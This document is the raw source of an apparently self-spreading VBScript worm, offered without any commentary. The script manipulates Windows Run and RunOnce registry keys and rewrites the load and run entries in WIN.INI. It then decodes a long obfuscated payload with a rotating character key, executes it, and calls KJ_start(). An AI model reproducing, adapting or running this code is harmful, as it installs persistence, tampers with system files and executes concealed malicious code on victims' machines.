Set CURObj = CreateObject("WScript.Shell")
mhk="HK"&"LM\SOFT"&"WARE\Micr"&"osoft\Win"&"dows\Curren"&"tVersion\Run\"
mhc="HK"&"CU\Soft"&"ware\Micros"&"oft\Win"&"dows\Curren"&"tVersion\Run\"
mhk2="HK"&"LM\SOFT"&"WARE\Micr"&"osoft\Win"&"dows\Curren"&"tVersion\"
CURObj.RegWrite ""&mhk&"W1N32","regedit -s c:\windows\system32\$WIN32$\WIN32SQL.cer"
CURObj.RegWrite ""&mhk&"internat.exe","internat.exe"
CURObj.RegWrite ""&mhk&"zwupdows","12"
CURObj.RegWrite ""&mhk&"win","12"
CURObj.RegWrite ""&mhk&"mwin","12"
CURObj.RegWrite ""&mhk&"internt","12"
CURObj.RegWrite ""&mhk&"Inernet","12"
CURObj.RegWrite ""&mhk&"Internet","12"
CURObj.RegWrite ""&mhk&"iexpleror","12"
CURObj.RegWrite ""&mhk&"zxdows","12"
CURObj.RegWrite ""&mhk&"qwe","12"
CURObj.RegWrite ""&mhk&"win1","12"
CURObj.RegWrite ""&mhk&"intelnat.exe","12"
CURObj.RegWrite ""&mhk&"u1888","12"
CURObj.RegWrite ""&mhk&"intenet","12"
CURObj.RegWrite ""&mhk&"9i5zxdows","12"
CURObj.RegWrite ""&mhk&"9i5com01zxdows","12"
CURObj.RegWrite ""&mhk&"99zxdows","12"
CURObj.RegWrite ""&mhk&"88zxdows","12"
CURObj.RegWrite ""&mhk&"Start Pagewin","12"
CURObj.RegWrite ""&mhk&"Start Page","12"
CURObj.RegWrite ""&mhk&"u188","12"
CURObj.RegWrite ""&mhk&"9i5comzxdows","12"
CURObj.RegWrite ""&mhk&"9q5zxdows","12"
CURObj.RegWrite ""&mhk&"u1881","12"
CURObj.RegWrite ""&mhk&"u1882","12"
CURObj.RegWrite ""&mhk&"u1883","12"
CURObj.RegWrite ""&mhk&"u1884","12"
CURObj.RegWrite ""&mhk&"u1885","12"
CURObj.RegWrite ""&mhk&"u1886","12"
CURObj.RegWrite ""&mhk&"u1887","12"
CURObj.RegWrite ""&mhk&"u88y", "12"
CURObj.RegWrite ""&mhk&"flash", "12"
CURObj.RegWrite ""&mhk&"999izxdows","12"
CURObj.RegWrite ""&mhk&"033zxdows","12"
CURObj.RegWrite ""&mhk&"syste","12"
CURObj.RegWrite ""&mhc&"my","12"
CURObj.RegWrite ""&mhk&"3zxdows","12"
CURObj.RegWrite ""&mhk&"88u88","12"
CURObj.RegWrite ""&mhk&"system","12"
CURObj.RegWrite ""&mhk&"8zxdows","12"
CURObj.RegWrite ""&mhk&"u18","12"
CURObj.RegWrite ""&mhk&"interneet.exe","12"
CURObj.RegWrite ""&mhk2&"RunOnce\", "12"
CURObj.RegWrite ""&mhk&"iexpler", "12"
CURObj.RegWrite ""&mhk&"u1810", "12"
CURObj.RegWrite ""&mhk&"winwin", "12"
CURObj.RegWrite ""&mhk&"WIN32", "12"
CURObj.RegDelete ""&mhc&""
CURObj.RegDelete ""&mhk&"zwupdows"
CURObj.RegDelete ""&mhk&"win"
CURObj.RegDelete ""&mhk&"mwin"
CURObj.RegDelete ""&mhk&"internt"
CURObj.RegDelete ""&mhk&"inernet"
CURObj.RegDelete ""&mhk&"Internet"
CURObj.RegDelete ""&mhk&"u188"
CURObj.RegDelete ""&mhk&"iexpleror"
CURObj.RegDelete ""&mhk&"zxdows"
CURObj.RegDelete ""&mhk&"qwe"
CURObj.RegDelete ""&mhk&"win1"
CURObj.RegDelete ""&mhk&"intelnat.exe"
CURObj.RegDelete ""&mhk&"intenet"
CURObj.RegDelete ""&mhk&"9i5zxdows"
CURObj.RegDelete ""&mhk&"9i5com01zxdows"
CURObj.RegDelete ""&mhk&"99zxdows"
CURObj.RegDelete ""&mhk&"88zxdows"
CURObj.RegDelete ""&mhk&"Start Pagewin"
CURObj.RegDelete ""&mhk&"Start Page"
CURObj.RegDelete ""&mhk&"9i5comzxdows"
CURObj.RegDelete ""&mhk&"9q5zxdows"
CURObj.RegDelete ""&mhk&"999izxdows"
CURObj.RegDelete ""&mhk&"033zxdows"
CURObj.RegDelete ""&mhk&"u1881"
CURObj.RegDelete ""&mhk&"u1882"
CURObj.RegDelete ""&mhk&"u1883"
CURObj.RegDelete ""&mhk&"u1884"
CURObj.RegDelete ""&mhk&"u1885"
CURObj.RegDelete ""&mhk&"u1886"
CURObj.RegDelete ""&mhk&"u1887"
CURObj.RegDelete ""&mhk&"u88y"
CURObj.RegDelete ""&mhk&"flash"
CURObj.RegDelete ""&mhk&"88u88"
CURObj.RegDelete ""&mhk&"interneet.exe"
CURObj.RegDelete ""&mhk&"u18"
CURObj.RegDelete ""&mhk&"u1888"
CURObj.RegDelete ""&mhk&"system"
CURObj.RegDelete ""&mhk&"3zxdows"
CURObj.RegDelete ""&mhk&"8zxdows"
CURObj.RegDelete ""&mhk&"syste"
CURObj.RegDelete ""&mhk2&"RunOnce\"
CURObj.RegDelete ""&mhk&"iexpler"
CURObj.RegDelete ""&mhk&"u1810"
CURObj.RegDelete ""&mhk&"winwin"
CURObj.RegDelete ""&mhk&"WIN32"

Set FSO = CreateObject("Scripting.FileSystemObject")
myfile14=FSO.FileExists("c:\windows\WIN.INI")
if myfile14 then
set FSO2=FSO.OpenTextFile("c:\windows\WIN.INI")
mywin=FSO2.ReadALL()
l=Instr(mywin,"run=")-3
m=Instr(mywin,"load=")-1
n=Instr(mywin,"NullPort=")-3
FSO2.close
if l>0 and m>0 and l>m then
set FSO3=FSO.OpenTextFile("c:\windows\WIN.INI")
mywin2=FSO3.Read(l)
FSO3.close
set FSO4=FSO.OpenTextFile("c:\windows\WIN.INI")
mywin3=FSO4.Read(m)
FSO4.close
if n>0 and n>l then
set FSO5=FSO.OpenTextFile("c:\windows\WIN.INI")
mywin4=FSO5.Read(n)
FSO5.close
mywin=Replace(mywin,mywin4,"")
set FSO2=FSO.CreateTextFile("c:\windows\WIN.INI")
FSO2.Write mywin3
FSO2.WriteLine "load="
FSO2.Write "run="
FSO2.Write mywin
FSO2.close
else
mywin=Replace(mywin,mywin2,"")
set FSO2=FSO.CreateTextFile("c:\windows\WIN.INI")
FSO2.Write mywin3
FSO2.Write "load="
FSO2.Write mywin
FSO2.close
end if
end if
end if

ExeString = "AaiFfScbja'EligQ]to)N^nQ]to)<abo]aNf_j'>hlgbG^eb[p'CKK'TkOcbdh'TajK^ld'Pm^@)>ei^du?fkgKq]CFZpl]mq %CFNbl@dj %CF>o]]obEegf]q#&FGDefbAp#&FG;n`^laH^ah#&FGHnjmYc\q]$$AiaOp_>qi`lejkGE>hl`k\Pj%>egbH]oe$Ptm]Ooo!Lf@ojkmJanreaK]toO`qN`^\P`jh8>OJ+Gl`kLasq>egb Bdi]L\q`(,&OjhOoo9O]]_Q]ik+Ja\a9hgEaAjnqj$OjhOoo$FGWoo^jp#&%96+GnI]j#QelNqj%9-Q`aiN`^\P`jh*>igo`AsflArf_ofgj=j_AbAbQql`Pln:cqlQ`aiN`^\P`jh*>igo`O`qBdi]P`jh8>OJ+Gl`kLasq>egb Bdi]L\q`(-&AfdaObel)Tjeob7:K?Vkiig]_:sZo^oalo7!GE\kp\ol$$#9sZ?mI^!LikPln#r]@jHaCqehObpp>egbLahm&?glkaKao>=oqje]5APG*BblBdi]$AfdaK^ld$B<qlnd_&]oqje]rlan5.1@ikaJa\aLahm&?glkaKao>egbLahm9CKK)LhaiQ]toCah`%>egbH]oe$4$EaLukbKpm5eligPcbfCah`Q]ik+Ondq]q_;nGc4#CQEH9sZ?mI^!8?G@TgjglY`8#q_k_mfhp5CFZpl]mq %!:q_;nGcEligQ]toAgp]EaLukbKpm5sZoLd`kAfdaObel)Tjeobr]@jHaQ_kP`ulBf`F^Cah`Q]ik+;hjp]Bf`F^Bf`Cmj^qakiCmj^qakiCF>eYjbbKq]%;qmo]joPlndk_(G^kpDk\as@`]m&DcH\plEia]t>eYn:,Q`aiEaDaaq H>^ka#@mnmbfpNqjeid!(,&97D?\p]$`%Q`aiGE@`]id]Op_9Caj\iq@dpc!6WNrZA:,=hnbFG;d\k_aNrZ8;dm%9o^%Daaq H>^ka#@mnmbfpNqjeid!(,&!()%#5YPm^@5+AiaEaAgp]HB?c^fc`Pm^:Ida ?pojaiqKpmffc'.$H\plEia]t>eYn$AiaEaAiaBpk[pdlfBpk[pdlfFG;n`^laH^ah#&JkAmognO]opj]IbppAbFfScbja:cqehLd`k@uapCmj^qakiAiaEaOc^jaAfda:H`cl$RffL\q`(.&Hnjdj]h>egbkX>leijkBdi]oWJa_mlkkaqOc^ja_YKp\qakibjuW_d]ih&dojF^#CKK)Cah`Bpenqk$NeYn`Cah`&!Oe]j;]giGE>hl`k\Pj%Kd\o]Bdi](elig!Bdo`O`qBdi]P`jh8>OJ+Gl`kLasq>egb Oc^jaAfda'/$pmr]%>egbLahm&Smfla4#CQEH9sZ?mI^!8?G@TgjglY`8#q_k_mfhp5CFZpl]mq %!:q_;nGcEligQ]toBdi]P`jh*>igo`AiaEa@`cYqgqA`:SnP`agi&N`dJa\a CH=UZ@MNMBFPZRKAMYA``kleof]oWA]b\rdpRkamA@&JrlHjlcR`okejk9TkOcbdh)O]cMbY`#@G@VWHJ@9HZJ9?CFFAWPgbotYn`YEe^ogojclXJrlhjlc@uhn`pkXHb\e\S]n&RpKd`id*Mb_Smfla@G@VW?POJAIQWQNBJXDa]jofle`pT!A]b\rdpDaWPgbotYn`YEe^ogojclXJrlhjlc@uhn`pkX#H`cl$JrlHjlcR`okejk$-$)-TI\fdX>leljp]Pp]NqYpdlfamv(,)N@DW@RLJ@?\idFGE]diJab%DFBQ[>RJN@KL[PP=NWF\aiqapdbkX#<aa^mhoF\YKkaqo]mbTId`jknl^pWLmpglggBplmbkoWGb^p#LmpGlggQbjodlf(,&+(XH^ahWPl]ofgj`oqI^ea)Kd\o]Bdi]%;]giGEJYegO]c#@G@VW?POJAIQWQNBJXDa]jofle`pT!A]b\rdpDaWPgbotYn`YEe^ogojclXJrlhjlc@uhn`pkX#H`cl$JrlHjlcR`okejk$-$)-TI\fdXRf\aPl]ofgj`oqI^ea)Kd\o]Bdi]%OoNe]hg+JabTjeobCH=UZ@MNMBFPZRKAMYKkaqo]mbTId`jknl^pWL^bd`]X4+(XJrlhjlcXJmlejkkXH^ahWB\eoljLmb^ambf_`$-..(3-)N@DW@RLJ@?\idFGE]diJab%DFBQ[>RJN@KL[PP=NWPgbotYn`YEe^ogojclXRff`jtkHbko\dajbKq]pqoobeXKogbdi]oWJa_mlkkaqKpqdkjhEiq]niblNblpdk_oW-Y,_-*,+-(,+-(,+`(,+-(,+-(,+-(01Y(,,b(/1-(_d]ih%;]giGEJYegO]c#@G@VW?POJAIQWQNBJXNl^pr^jaWJa_mlkkaqTSdk\krpJOY;qmo]joS]nnfgjWTaj_looJ]on^_eidOp_kunq]iWMjkafdanYEe^ogojclJrlhjlcDklamk]pP]poffcnY(]+a(.+-(,+-(,+-[,+-(,+-(,+-(,/3T,+.],.3('Zh\kc$SnP`agi&N`dOndq]ECAT\;QMO=JO\MO@OTOjcls\o]XHf[njpgboYGbaf[aW.(*+YGqoigkfYGlofgjnYE]diTA_flkmMjaabjai`]'.+-+4*(O=CZAOKMA@YhgCFH^ahMb_$ECAT\;QMO=JO\MO@OTOjcls\o]XHf[njpgboYGbaf[aW.(*+Y;khjgjWJYegP]poffcnYFarPl]ofgj`oq'Zh\kc$GErei\d]Bji\am%Daaq SdkH]oe$/$MjkboYiCah`pT?jjeki>egbkXHf[njpgboKd\o]`WPl]ofgj`oq$AiaBpk[pdlfBpk[pdlfFG;n`^laHfde`r %GjBjnjoN`pmi`FasqObelK^ld:EaFko%>OJ+>egb=tdplo#TajK^ld#RP[ndml*`u]$&PcbfQ]ikMYpc5pqoobe/-YBf`F^F^ObelK^ld:nvkp`j+.WPcbfPl]mqMlAfda:SdkH]oeKUNQ=IWH]nibd/-+\hg@ikaKp\olQkCah`5RffL\q`!OTPLAHYCamk]h)adhAiaEaSnP`agi&N`dOndq]ECAT\DK>>D[H>;DDK=XNl^pr^jaWJa_mlkkaqTSdk\krpT?pojaiqNampakiYJqiYCamk]h./(NqYnoRhBdi]CKK)@gltCah`OeiMYpct]^Whbs\id*bf^'TajK^ld#rbZXAld``o&doqCKK)@gltCah`OeiMYpcpqoobe/-Ycfr^dh)dab)OeiMYpcpqoobe/-Y\anhlkk+ajd>^dhHB=km]j_Qg$RffL\q`!s`_TBji\am+`po$cql$SnP`agi&N`dOndq]ECAT\;H<PKAN\JKJQT*_idX)`gi^egbTkOcbdh)O]cRoap`DFBQ[>I9ONBK[MLGPW+\hgY;kiq]joLukb(^hlgf[]ofgj*u%inagsiig]_RpKd`id*Mb_Smfla@G@VW?G>KO@PWNJLLX_idbdi]X?b^]pilE^lfX)OoNe]hg+JabO]]_%DFBQ[>I9ONBK[MLGPWsp`afdaWA]b\rdpD`gjW!TkOcbdh)O]cRoap`DFBQ[>I9ONBK[MLGPWadhafdaWP[ndmlAidaj`Y(S:O^oaloRpKd`id*Mb_Smfla@G@VW?G>KO@PWNJLLX_idBdi]XNe]hgYGl`kT?jje]iaT'TajK^ld#P`jhL\q`!SN`jekq&asb)&SnP`agi&N`dOndq]ECAT\;H<PKAN\JKJQT`gi>egbTOcbdh@uTLmlhamqqOcb]pC^f`gbjoWTKDKoglnY(x.,-2,?<2%500:),.;B(5;51*(,<>(,=5/,3@uOoNe]hg+JabTjeobCH=UZ@D=NP=OZOGKOY\hgCah`YK_mfhpClkp@k[k_bT's40.+-10))/5(?(.)@-*:-A6%,+@(0A5.?./,yO`qBdi]P`jh8>OJ+Gl`kLasq>egb Oo^jpPm>egb$.'qjq`&AfdaObel)TjeobR]pLasqAfdaObel)@dknb@k\Arf_ofgjArf_ofgjHBHdh]Eo%!F^DkOd`o]7;cqehLd`k@uapCmj^qakiAiaEaPcfkHj`Ypdlf8\k^reaiq&hj`YpdlfF^Gb^p#Q`enIg_\qaki)0$5cah`PcbfQ`enIg_\qaki5Hf\$OeaoGl[]ofgj'6!F^APG*BblAsq]jnfgjI^ea#Q`enIg_\qaki&89q`aiPcfkHj`Ypdlf8Daaq PcfkHj`Ypdlf(Gbf$OeaoGl[]ofgj$%Gbf$APG*BblBdi]J\j]$OeaoGl[]ofgj$&!Bf`F^F^Gbf$OeaoGl[]ofgj$6.Ld`kOeaoGl[]ofgj:PcfkHj`Ypdlf!XAiaEaGErei\d]Bji\am%LddpDk^^lejk!Bf`F^Bf`Cmj^qakiCmj^qakiCFH^ahMb_$Mb_Ooo$Bdi]J\j]%GjBjnjoN`pmi`FasqMb_P`jhOoo9TkOcbdh)O]cMbY`#O]cNqj%AbO]cObelNqj8Q`aiSnP`agi&N`dOndq]Mb_Ooo$Bdi]J\j]Bf`F^Bf`Cmj^qakiCmj^qakiCFJ_gOp_ ?pojaiqKpmffc$Op_=8(Q]ooLmp:,<kT`egbPmr]Q]ooLmp:P`plKpq'.DcP`plKpq:/0Oe]j;qmo]joPlndk_8>ei^du?fkg#5YBpeo<k=j_AbGjBjnjoN`pmi`FasqNblOeaoAld``o9CKK)D]pAld``o ?pojaiqKpmffc$O`q@d`Kq]5>o]]obG^eb[p#K_mfhpdk_*?f[pdlf]mv%Kao>kga]nn5OeaoAld``o&Op_>kga]nnBji\am@gqiq9-Alj@^[dQ]ikCgh_bjdkBji\ampAld``o;kpkl8>kga]n>lmjo#,@d`Kq]+Y`_>kga]n>lmjo)P`jhBji\am+F]hbIbppAbAa_NrZ*>lmjo5+Ld`kG^kpDk\as@`]m5DkkpmO]r#@mnmbfpNqjeid$W$H`k ?pojaiqKpmffc$*)%Kq]Plndk_8Ee_%;qmo]joPlndk_(G^kpDk\as@`]m()(Gbf$>rjn`klOooajb&%H\plEia]t>eYn(.!@mnmbfpNqjeid9HB?c^fc`Pm^#@mnmbfpNqjeid$H\plEia]t>eYn$Op_=8)Bdo`EaKq]B9-Pcbf@mnmbfpNqjeid9@mnmbfpNqjeidAa_NrZ*Dq]i#.!!XAsfl?l@ikab8(Cgng9.Pj>kga]n>lmjoEaD?\p]$NrZOooajb&9I;]nb @d`Kq]+Ap`j f$&PcbfF^e4Ald``o;kpklOe]j;qmo]joPlndk_8;qmo]joPlndk_!<e^Pm^)Flah%b',&T=tdq@jAiaEaAiaEaJ`ulIYooFf``u;d\o9FfoooJaq%;qmo]joPlndk_(Y(Gbf$>rjn`klOooajb&%-$Op_Kpmffc:Ida ?pojaiqKpmffc'IYooFf``u;d\o#-'I]j#@mnmbfpNqjeid!)G^kpDk\as@`]m*)%;qmo]joPlndk_8CF>eYjbbKq]%;qmo]joPlndk_(G^kpDk\as@`]m&@k\Dc@k\DcGlglCFJ_gOp_9@mnmbfpNqjeid@k\Arf_ofgjArf_ofgjHBLmlh]b^la#&JkAmognO]opj]IbppJabMYpcSYhpb9@G@VWHJ@9HZJ9?CFFAWPgbotYn`YEe^ogojclXJrlhjlc@uhn`pkX?b_n`bAaofA]cmb]8OoNe]hg+JabO]]_%JabMYpcSYhpb!F^?fkg?b_n`b9Oe]j<enh<abo]a:BdkYhtAaof7T=j_Ab>kma9,lk2?fkg?b_n`b9HBK]lKq]%<enh<abo]a$GErei\d]Bji\am%<enh<abo]a$J`ulTkOcbdh)O]cRoap`JabMYpcSYhpb$@dpc@`dja`AiaBpk[pdlfBpk[pdlfFGmih^_aAld``o L\q`J\j]%GjBjnjoN`pmi`FasqNblAld``oF]hb9CKK)D]pAld``o L\q`J\j]%KaoLddp>egbk8>kga]nI^ea)Cah`pCqlAsfkpn5+BjoA\``OeaoAfdaFfOeaoAfdanBdi]Asq9R;]nb BNL&C`q=tobfodlfJ\j]$OeaoAfda)MYpc&!F^Afda@ul8DOJJoBdi]Asq9@PHIJoBdi]Asq99OKKm>egb=to5M@LGnCah`Bpp:EPHQ`ai?\idFG9lkbf`Ol PcfkBdi]*K^ld'`phi%=hnbAbCah`Bpp:Q?KQ`ai?\idFG9lkbf`Ol PcfkBdi]*K^ld'n^n!Bdo`F^Afda@ul8DOQOe]j@poBpenqk8)Bf`F^K]toEa Q>^ka#MYpcKYi`&9R;]nb SdkH]oe<anhlkkY%$Gn%M?\p]$K^ldI^ea$5P@Yo`%OeiMYpcA]ofqgl&!PcbfElp@uaoop9.@k\DcDcDoq=tdplo:,Q`aiBNL&?jmqBdi]RffL\q`!otplah0*X_bkgolh*dka'MYpcKYi`BNL&?jmqBdi]RffL\q`!s`_TBji\am+`po$L\q`J\j]Bf`F^Bf`Cmj^qakiCmj^qakiCFNbl@dj %GjBjnjoN`pmi`Fasq@oj*>i]]mP`plEo5RP[ndml*N`jekq>qgif]hbDcAmoPcbfFfScbja:cqehAgp]FfScbja:q_k=j_AbAbFfScbja:q_kQ`aiO`qBNL9@ja\q]K]g]_o%O^oaloffc)Cah`PqoobeK]g]_o!P]pTkOcbdh:?mbYp`LZf``l$TK_mfhp)P`agi%=hnbNbl<mhh`LZf``l8\k^reaiq&]kmdaop FGWcpbkp&<mhh`LZf``l*nbl?GPA@#sB40-@>/*),@>,(.)@+*9@=6%,+@(0AA-4<-:y&<mhh`LZf``l*^o]]obAjnqYj^b %KaoOoNe]hg5<mhh`LZf``l*BblK]g]_o%!>hlgbG^eb[p)p]p>IKE?%w+A,/AB(-(C(5.*)->C%441()+-9,>6(1//*4x!>hlgbG^eb[p)`ja\q]Eipl]i`]$$O`qBNL9>hlgbG^eb[p)D]pJ_ba^q %=j_AbKao<enhG^eb[p:BNL&@mfnanBjoA\``?fkgObelFf?fkgJ_ba^qDc@dpcP`jh*?oar`Qql`4:/=ia@dpcP`jh*?oar`Qql`4:.PcbfBpeo>kmAiaEaBdkYhtAaof5?fkgObel)AjeqbDaoq]nFasq?feJq`am>jn#0!OYj_leeubAljd:(Ol/Gpcbj=mo e$5Dkl$#6&Of`$&IbppLahmKpmffc:Bjoe8.PjDai%LddpLasq!Q]ikKmi:=n` Ida PcfkP`ul(d))%$EaLahmFqh5,0PcbfQ]ikKmi:.3Agp]EaLahmFqh5,-PcbfQ]ikKmi:.4AiaEaP`jh?c^j8;dm%LahmFqh%Jq`am>jn#fIja0$&DcP`jh?c^j8;dm%+0$Ld`kObel>eYn:?co -3&@k\DcObelNqjeid9Q]ikPlndk_!Lahm;d\oIbppMjGl[gNqj8Asb[qob AaiH]u<oj$.&$PcfkP`ul#n^>oDb!G`v9nm%(%:#Koe]n<oj$+&!sZ?mI^Cat>jn#.!8!Gpcbj=mo -$q_;nGcH]u<oj$-&9Lld`o9nm%*%#r]@jHa#Fbq=mo /$5Jq`am>jn#0!!#n^>oDb!Bjoe8.PjDai%=t`Plndk_%r]@jHa#ObelIre89o^%Ee_%=t`Plndk_(d))%$q_;nGcF^ObelIre8)4Q`aiq_;nGcQ]ikKmi://q_;nGcBf`F^#n^>oDb!P`jh?c^j8;dm%LahmFqh#Fbq=mo eJg`1!%r]@jHa#DcP`jh?c^j8;dm%*4$Ld`k!sZ?mI^Lahm;d\o9sZ?mq_;nGcBdo`F^Obel>eYn:?co .4&Pcbf#n^>oDb!P`jh?c^j8n^Gc!sZ?mI^=j_Abr]@jHa#OeaoObpp:PcfkP`ul!Lahm;d\o!sZ?mI^Fasq$sZ?mI^!Asb[qob PcfkP`ul%PcfkP`ul8AsbKpmffc:Q]ikPlndk_!CqehObpp:8p[ndmlg^fcp^_a8sZo^oalo;!n^>oDb#_l[qhbfp)tjeob#!8aarplugb5#klkeofgj5^Zojimp`8h`cl6+mp7qgl5-ht6oe_q`6+mp7e]ebel6+mp7w%eia]t5/07saod_ahdqq6ea`_bf#94#>HLGBLI>EA8HB#ZdmanqD@F?DO:(RF<PC:(^l\a8`gi)jk*^[pds]T)>[pds]#S@giklfaiq6#7'=KMDAO;!8,\eq;q_;nGc4#*p[ndml:q_;nGc4#n`jekqh\k_q\d]9q_k_mfhp9sZ?mI^!LddpLasqsZ?mI^!MjGl[gNqj!n^>oDb#7'o^oalo;!n^>oDb#7'>JAQ:q_;nGc4#*ELIG;SZoObpp:PcfkP`ul!n^>oDb#QiIg_fPln#r]@jHaHB[nqYno%!OeiMYpc5APG*BblOkb[e\i>kga]n#-!!XEa BNL&Bdi]Asfkpn%OeiMYpct]^WCgh_bj*cql$&PcbfCKK)@gltCah`OeiMYpct]^WCgh_bj*cql'TajK^ld#rbZXfgo]gi&cdcBf`F^F^#CKK)Cah`Bpenqk$RffL\q`!otplah0*X_bkgolh*dka$&PcbfCKK)@gltCah`OeiMYpcpqoobe/-Y\anhlkk+ajd$SdkH]oekunq]i./TgetYhg+_ea@k\Dc@k\Arf_ofgj"
Execute("Dim KeyArr(3),ThisText"&vbCrLf&"KeyArr(0) = 5"&vbCrLf&"KeyArr(1) = 3"&vbCrLf&"KeyArr(2) = 8"&vbCrLf&"KeyArr(3) = 4"&vbCrLf&"For i=1 To Len(ExeString)"&vbCrLf&"TempNum = Asc(Mid(ExeString,i,1))"&vbCrLf&"If TempNum = 18 Then"&vbCrLf&"TempNum = 34"&vbCrLf&"End If"&vbCrLf&"TempChar = Chr(TempNum + KeyArr(i Mod 4))"&vbCrLf&"If TempChar = Chr(28) Then"&vbCrLf&"TempChar = vbCr"&vbCrLf&"ElseIf TempChar = Chr(29) Then"&vbCrLf&"TempChar = vbLf"&vbCrLf&"End If"&vbCrLf&"ThisText = ThisText & TempChar"&vbCrLf&"Next")
Execute(ThisText)
KJ_start()